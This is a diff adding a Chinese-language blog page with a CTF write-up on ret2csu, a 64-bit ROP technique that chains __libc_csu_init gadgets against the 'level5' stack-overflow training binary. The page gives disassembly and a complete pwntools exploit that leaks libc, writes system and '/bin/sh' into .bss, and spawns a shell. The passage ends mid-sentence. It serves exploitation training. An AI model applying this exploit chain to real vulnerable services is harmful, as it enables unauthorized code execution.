@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>中级ROP-ret2__libc_csu_init-writeup | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctfpwn">
+  
+  
+  
+  
+  <meta name="description" content="用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中级ROP-ret2__libc_csu_init-writeup">
+<meta property="og:url" content="https://qianfei11.github.io/2019/02/12/中级ROP-ret2-libc-csu-init-writeup/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://qianfei11.github.io/pics/中级ROP-ret2__libc_csu_init-writeup/1.png">
+<meta property="og:image" content="https://qianfei11.github.io/pics/中级ROP-ret2__libc_csu_init-writeup/2.png">
+<meta property="og:updated_time" content="2019-02-14T01:40:26.013Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="中级ROP-ret2__libc_csu_init-writeup">
+<meta name="twitter:description" content="用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。">
+<meta name="twitter:image" content="https://qianfei11.github.io/pics/中级ROP-ret2__libc_csu_init-writeup/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/fashion.css">
+  <link rel="stylesheet" href="/css/glyphs.css">
+
+</head>
+</html>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  
+  <div class="site-header-image">
+    <img id="originBg" width="100%" alt="Hike News" src>
+  </div>
+
+  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
+    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
+  </div>
+
+  <script>
+        var imgUrls = "css/images/pose01.jpg".split(",");
+        var random = Math.floor((Math.random() * imgUrls.length ));
+        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
+          document.getElementById("originBg").src=imgUrls[random];
+          document.getElementById("blurBg").src=imgUrls[random];
+        } else {
+          document.getElementById("originBg").src='/' + imgUrls[random];
+          document.getElementById("blurBg").src='/' + imgUrls[random];
+        }
+    </script>
+
+
+
+
+<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">ZJGSU-IS-17</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-中级ROP-ret2-libc-csu-init-writeup" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      中级ROP-ret2__libc_csu_init-writeup
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/02/12/中级ROP-ret2-libc-csu-init-writeup/" class="article-date">
+	  <time datetime="2019-02-12T10:02:50.000Z" itemprop="datePublished">February 12, 2019</time>
+	</a>
+
+       
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。</p>
+<a id="more"></a>
+<p>64位的程序中，函数所调用的参数并不是全部在栈上，前六个参数分别位于<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>，其余参数则在栈上。同时，可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常。所以64位的程序需要通过rop或者libc中的函数来设置参数。</p>
+<h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>程序给出的源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只开了NX，那么<code>vulnerable_function()</code>中的栈溢出是很显然的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ROP_STEP_BY_STEP/linux_x64/level5_ori/level5'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>没有任何可辅助的函数，同时也找不到可用的gadgets来用，这里就要用到libc中的一个函数<code>__libc_csu_init()</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A0                 mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5                 mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA                 lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1                 lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8                 mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD                 mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2                 mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7                 mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC                 sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0                 sub     rbp, r12</span><br><span class="line">.text:00000000004005D3                 mov     r13d, edi</span><br><span class="line">.text:00000000004005D6                 mov     r14, rsi</span><br><span class="line">.text:00000000004005D9                 sar     rbp, 3</span><br><span class="line">.text:00000000004005DD                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E0                 call    _init_proc</span><br><span class="line">.text:00000000004005E5                 test    rbp, rbp</span><br><span class="line">.text:00000000004005E8                 jz      short loc_400606</span><br><span class="line">.text:00000000004005EA                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j</span><br><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br></pre></td></tr></table></figure>
+<p>可以看到在<code>loc_4005F0</code>之后，有对第三个参数<code>rdx</code>、第二个参数<code>rsi</code>以及第一个参数<code>rdi</code>的<code>mov</code>操作。同时如果合理设置<code>r12</code>和<code>rbx</code>的大小，我们能够做到<code>call</code>某个函数。尾巴上还有<code>mov</code>栈上的值到一些寄存器中，仔细观察可以发现这和之前的参数也有一些联系。构造出一个<code>csu()</code>的函数。因为在第二次跳转上去后，还有一次<code>add rsp, 0x38</code>，所以需要在栈上再补56个byte：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  4005f0:       4c 89 fa                mov    rdx,r15</span></span><br><span class="line"><span class="comment">#  4005f3:       4c 89 f6                mov    rsi,r14</span></span><br><span class="line"><span class="comment">#  4005f6:       44 89 ef                mov    edi,r13d</span></span><br><span class="line"><span class="comment">#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment">#  4005fd:       48 83 c3 01             add    rbx,0x1</span></span><br><span class="line"><span class="comment">#  400601:       48 39 eb                cmp    rbx,rbp</span></span><br><span class="line"><span class="comment">#  400604:       75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span></span><br><span class="line"><span class="comment">#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="comment">#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="comment">#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="comment">#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="comment">#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="comment">#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="comment">#  400624:       48 83 c4 38             add    rsp,0x38</span></span><br><span class="line"><span class="comment">#  400628:       c3                      ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret_addr)</span>:</span></span><br><span class="line">    <span class="comment"># function = r12</span></span><br><span class="line">    <span class="comment"># rdi = r13, rsi = r14, rdx = r15</span></span><br><span class="line">	payload = flat([<span class="string">'\x00'</span> * <span class="number">136</span>, <span class="number">0x400606</span>, <span class="number">0</span>, rbx, rbp, r12, r13, r14, r15, <span class="number">0x4005f0</span>, <span class="string">'\x00'</span> * <span class="number">56</span>, ret_addr])</span><br><span class="line">	<span class="comment"># print repr(payload)</span></span><br><span class="line">	p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h1><p>然后接下来的主要分为三步。第一步泄漏出<code>write()</code>函数的地址，以获取libc：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write(STDOUT_FILENO, write_got, 8);</span></span><br><span class="line"><span class="comment"># r12 = write_got</span></span><br><span class="line"><span class="comment"># rdi = 1, rsi = write_got, rdx = 8</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main)</span><br><span class="line">write = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'write = '</span> + hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;'</span>)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">execve = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'execve = '</span> + hex(execve))</span><br></pre></td></tr></table></figure>
+<p>这里对libc的泄漏同样也可以通过<code>DynELF</code>来爆破：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">	csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, address, <span class="number">8</span>, main_addr)</span><br><span class="line">	data = p.recv(<span class="number">8</span>)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;'</span>)</span><br><span class="line">dynelf = DynELF(leak, elf=elf)</span><br><span class="line">system_addr = dynelf.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure>
+<p>拿到libc后可以获得<code>system</code>或者是<code>execve</code>的偏移。同时我们发现bss段可写，故接下来在bss段写入system的地址，以及字符串<code>/bin/sh</code>：</p>
+<p><img src="/pics/中级ROP-ret2__libc_csu_init-writeup/1.png" alt="bss段可写"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read(STDIN_FILENO, bss, 16)</span></span><br><span class="line"><span class="comment"># r12 = read_got</span></span><br><span class="line"><span class="comment"># rdi = 0, rsi = bss, rdx = 16</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">16</span>, main)</span><br><span class="line">payload = flat([system, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>最后一部只需要执行<code>call</code>已经写入的system并且将<code>/bin/sh</code>作为参数执行即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># execve("/bin/sh"); or system("/bin/sh");</span></span><br><span class="line"><span class="comment"># r12 = execve/system</span></span><br><span class="line"><span class="comment"># rdi = bss + 8 = "/bin/sh"</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; EXECUTE execve("/bin/sh") OR system("/bin/sh") &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss, bss + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main)</span><br></pre></td></tr></table></figure>
+<p>整理一下，最后的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment"># p = remote('127.0.0.1',10001)</span></span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">log.success(<span class="string">'write_got = '</span> + hex(write_got))</span><br><span class="line">log.success(<span class="string">'read_got = '</span> + hex(read_got))</span><br><span class="line">log.success(<span class="string">'main = '</span> + hex(main))</span><br><span class="line">log.success(<span class="string">'bss = '</span> + hex(bss))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  4005f0:       4c 89 fa                mov    rdx,r15</span></span><br><span class="line"><span class="comment">#  4005f3:       4c 89 f6                mov    rsi,r14</span></span><br><span class="line"><span class="comment">#  4005f6:       44 89 ef                mov    edi,r13d</span></span><br><span class="line"><span class="comment">#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment">#  4005fd:       48 83 c3 01             add    rbx,0x1</span></span><br><span class="line"><span class="comment">#  400601:       48 39 eb                cmp    rbx,rbp</span></span><br><span class="line"><span class="comment">#  400604:       75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span></span><br><span class="line"><span class="comment">#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="comment">#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="comment">#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="comment">#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="comment">#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="comment">#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="comment">#  400624:       48 83 c4 38             add    rsp,0x38</span></span><br><span class="line"><span class="comment">#  400628:       c3                      ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret_addr)</span>:</span></span><br><span class="line">	payload = flat([<span class="string">'\x00'</span> * <span class="number">136</span>, <span class="number">0x400606</span>, <span class="number">0</span>, rbx, rbp, r12, r13, r14, r15, <span class="number">0x4005f0</span>, <span class="string">'\x00'</span> * <span class="number">56</span>, ret_addr])</span><br><span class="line">	<span class="comment"># print repr(payload)</span></span><br><span class="line">	p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi = edi = r13, rsi = r14, rdx = r15</span></span><br><span class="line"><span class="comment"># write(STDOUT_FILENO, write_got, 8);</span></span><br><span class="line"><span class="comment"># r12 = write_got</span></span><br><span class="line"><span class="comment"># rdi = 1, rsi = write_got, rdx = 8</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main)</span><br><span class="line">write = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'write = '</span> + hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;'</span>)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">execve = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'execve = '</span> + hex(execve))</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(STDIN_FILENO, bss, 16);</span></span><br><span class="line"><span class="comment"># r12 = read_got</span></span><br><span class="line"><span class="comment"># rdi = 0, rsi = bss, rdx = 16</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">16</span>, main)</span><br><span class="line">payload = flat([system, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve("/bin/sh"); or system("/bin/sh");</span></span><br><span class="line"><span class="comment"># r12 = execve/system</span></span><br><span class="line"><span class="comment"># rdi = bss + 8 = "/bin/sh"</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; EXECUTE execve("/bin/sh") OR system("/bin/sh") &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss, bss + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>做题的时候遇到的一个小bug是当传的payload中的无意义字符如果不为<code>\x00</code>，最后跑system会坏掉，但是execve不会影响。如果将buf填充为<code>\x00</code>，才可以执行system。具体原因还没有弄清楚。</p>
+<p>以下再补充一点关于<code>__libc_csu_init()</code>的点，也就是隐藏gadgets：</p>
+<p><img src="/pics/中级ROP-ret2__libc_csu_init-writeup/2.png" alt="隐藏gadgets"></p>
+<p>也是libc设计时的一个bug，不同的偏移下，还能够得到<code>pop rdi ; ret</code>和<code>pop rsi ; pop r15 ; ret</code>两个gadgets：</p>
